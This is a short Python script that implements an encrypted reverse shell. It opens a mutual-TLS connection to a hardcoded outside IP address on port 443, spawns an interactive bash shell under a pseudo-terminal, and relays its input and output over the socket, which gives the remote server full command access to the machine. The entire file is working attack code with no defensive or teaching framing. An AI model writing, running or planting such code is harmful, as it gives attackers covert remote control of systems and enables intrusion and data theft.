import socket, ssl, os, pty, threading

SERVER_IP = "13.221.46.202"
SERVER_PORT = 443

context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="certs/ca.crt")
context.load_cert_chain(certfile="certs/client.crt", keyfile="certs/client.key")

sock = socket.socket()
tls_sock = context.wrap_socket(sock, server_hostname="server")
tls_sock.connect((SERVER_IP, SERVER_PORT))

pid, fd = pty.fork()

if pid == 0:
    os.execvp("/bin/bash", ["/bin/bash", "-i"])
else:
    def socket_to_shell():
        while True:
            data = tls_sock.recv(1024)
            if not data:
                break
            os.write(fd, data)

    def shell_to_socket():
        while True:
            try:
                data = os.read(fd, 1024)
                if not data:
                    break
                tls_sock.sendall(data)
            except OSError:
                break

    threading.Thread(target=socket_to_shell, daemon=True).start()
    threading.Thread(target=shell_to_socket, daemon=True).start()

    threading.Event().wait()
